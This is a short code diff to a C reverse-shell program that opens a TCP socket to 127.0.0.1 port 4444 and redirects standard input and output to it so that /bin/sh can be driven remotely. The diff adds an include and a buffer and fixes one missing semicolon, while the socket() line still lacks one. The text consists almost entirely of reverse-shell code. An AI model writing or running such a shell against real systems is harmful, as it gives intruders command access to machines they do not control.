@@ -3,6 +3,7 @@
 #include<sys/socket.h>
 #include<sys/types.h>
 #include<netinet/in.h>
+#include<string.h>
 #include<strings.h>
 #include<unistd.h>
 #include<arpa/inet.h>
@@ -15,7 +16,7 @@ int main()
         int sockaddr_len = sizeof(struct sockaddr_in);
         // Change arguments as needed
         char *arguments[] = { "/bin/sh", 0, "4444", "127.0.0.1", "YOLOOOOOOO" };
-
+        char buf[16];
 
         sock = socket(AF_INET, SOCK_STREAM, 0)
       
@@ -24,7 +25,7 @@ int main()
         server.sin_addr.s_addr = inet_addr(arguments[3]);
         bzero(&server.sin_zero, 8);
 
-        connect(sock, (struct sockaddr *)&server, sockaddr_len)
+        connect(sock, (struct sockaddr *)&server, sockaddr_len);
 
         dup2(sock, 0);
         dup2(sock, 1);
